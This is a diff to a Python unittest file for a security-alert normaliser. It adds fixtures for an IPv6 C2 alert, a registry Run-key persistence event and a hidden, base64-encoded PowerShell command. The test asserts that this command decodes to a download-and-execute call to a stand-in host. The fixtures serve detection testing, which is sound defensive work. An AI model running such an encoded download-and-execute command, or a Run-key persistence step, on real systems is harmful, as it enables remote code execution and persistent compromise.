@@ -16,8 +16,10 @@ import unittest
 from pathlib import Path
 
 CONFIG_DIR = Path(__file__).resolve().parents[1] / "config"
-if str(CONFIG_DIR) not in sys.path:
-    sys.path.insert(0, str(CONFIG_DIR))
+TESTS_DIR = Path(__file__).resolve().parent
+for _path in (str(CONFIG_DIR), str(TESTS_DIR)):
+    if _path not in sys.path:
+        sys.path.insert(0, _path)
 
 from test_rag_regressions import _install_runtime_stubs  # noqa: E402
 
@@ -136,6 +138,36 @@ UNEXPECTED_SCHEMA_ALERT = {
     },
 }
 
+IPV6_ALERT = {
+    "timestamp": "2026-06-06T00:09:00Z",
+    "rule": {"level": 10, "id": "86650", "description": "IPv6 C2 callback"},
+    "agent": {"name": "edge-01", "ip": "2001:db8::10"},
+    "data": {
+        "srcip": "2001:db8:85a3::8a2e:370:7334",
+        "dstip": "2001:db8::10",
+        "srcport": "44321",
+        "dstport": "443",
+        "protocol": "https",
+    },
+}
+
+SYSMON_REGISTRY_ALERT = {
+    "timestamp": "2026-06-06T00:10:00Z",
+    "rule": {"level": 12, "id": "92014", "description": "Sysmon - Event 13: Registry value set"},
+    "agent": {"name": "WIN-DC01"},
+    "data": {
+        "win": {
+            "system": {"computer": "WIN-DC01.corp.local", "eventID": "13"},
+            "eventdata": {
+                "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "targetObject": r"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Update",
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; HALFBAKED)",
+                "commandLine": "powershell.exe -enc ZQ==",
+            },
+        }
+    },
+}
+
 
 def _canonical(alert, source="test"):
     return AlertNormalizer.normalize(alert, index=1, ingestion_source=source)
@@ -187,6 +219,7 @@ class NormalizerFixtureTests(unittest.TestCase):
         self.assertIn("powershell.exe", process["path"])
         self.assertIn("explorer.exe", process["parent_process"])
         self.assertEqual(process["pid"], "4812")
+        self.assertEqual(process["name"], "powershell.exe")
         self.assertEqual(alert["dest_ip"], "203.0.113.90")
         self.assertEqual(alert["host_context"]["name"], "WIN-DC01.corp.local")
         # The composite Sysmon hash string is split into individual digests.
@@ -222,6 +255,22 @@ class NormalizerFixtureTests(unittest.TestCase):
         self.assertIn("203.0.113.201", rendered)
         cleaned = AlertAnalyzer().clean_log_data([canonical])
         self.assertEqual(len(cleaned), 1)
+
+    def test_ipv6_endpoints_are_normalised(self):
+        cleaned = _clean(IPV6_ALERT)
+        self.assertEqual(len(cleaned), 1)
+        alert = cleaned[0]
+        self.assertEqual(alert["src_ip"], "2001:db8:85a3::8a2e:370:7334")
+        self.assertEqual(alert["dest_ip"], "2001:db8::10")
+        self.assertIn("2001:db8:85a3::8a2e:370:7334", alert["observed_iocs"]["ips"])
+
+    def test_sysmon_registry_and_user_agent_are_preserved(self):
+        cleaned = _clean(SYSMON_REGISTRY_ALERT)
+        self.assertEqual(len(cleaned), 1)
+        alert = cleaned[0]
+        self.assertIn("CurrentVersion\\Run\\Update", alert["windows_context"]["registry_key"])
+        self.assertEqual(alert["http_context"]["user_agent"], "Mozilla/5.0 (Windows NT 10.0; HALFBAKED)")
+        self.assertTrue(alert["observed_iocs"].get("registry_keys"))
 
 
 class NormalizerContractTests(unittest.TestCase):
@@ -374,6 +423,35 @@ class DropAccountingTests(unittest.TestCase):
         cleaned = analyzer.clean_log_data([{"timestamp": "2026-06-06T00:08:00Z"}])
         self.assertEqual(cleaned, [])
         self.assertEqual(analyzer.last_clean_stats["dropped_no_signal"], 1)
+
+    def test_encoded_powershell_yields_observed_url_without_replacing_command(self):
+        encoded = (
+            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+            "LgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEA"
+            "LgAxADAAMAAuADIAOQAvAHUAcABkAGEAdABlAC4AdgBiAHMAJwApAA=="
+        )
+        alert = {
+            "timestamp": "2026-09-17T04:12:11.000Z",
+            "rule": {"id": "92006", "level": 12, "description": "Sysmon encoded PowerShell"},
+            "agent": {"name": "POS-REGISTER-07", "ip": "192.168.56.77"},
+            "data": {
+                "win": {
+                    "eventdata": {
+                        "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                        "commandLine": f"powershell.exe -nop -w hidden -enc {encoded}",
+                        "user": r"POS\cashier07",
+                    }
+                }
+            },
+        }
+        cleaned = _clean(alert)
+        self.assertEqual(len(cleaned), 1)
+        process = cleaned[0]["process_context"]
+        self.assertIn("-enc", process["command_line"])
+        self.assertIn("http://198.51.100.29/update.vbs", process.get("decoded_command_line") or "")
+        self.assertEqual(process["name"], "powershell.exe")
+        self.assertIn("198.51.100.29", cleaned[0]["observed_iocs"].get("ips") or [])
+        self.assertNotIn(r"\cashier07", str(cleaned[0].get("raw_alert_artifacts", {}).get("file_paths") or []))
 
 
 if __name__ == "__main__":
